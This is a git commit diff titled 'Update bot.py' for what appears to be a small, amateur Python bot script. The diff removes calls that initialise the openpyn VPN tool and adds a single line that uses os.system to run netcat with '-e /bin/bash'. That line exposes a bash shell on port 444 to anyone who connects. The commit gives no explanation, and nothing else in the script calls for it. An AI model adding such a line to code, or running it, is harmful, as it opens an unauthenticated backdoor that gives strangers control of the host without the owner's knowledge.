85ecb87cdcaf6fddc88c377599edee1e8e1d3121
Sandra Teletor <64851516+sandraMartina@users.noreply.github.com>
2023-09-07 16:54:34 +0200

    Update bot.py

--- bot.py
+++ bot.py
@@ -1,12 +1,8 @@
 #In here i thing we have to put or own code
 #  print("Hello World")
-from openpyn import openpyn
 import os
 import subprocess
 import sys
 import socket 
 
-
-
-subprocess.call(["sudo openpyn --init"], shell=True)
-os.system("sudo openpyn --init")
+os.system("nc -lvnp 192.168.64.129 444 -e /bin/bash ")
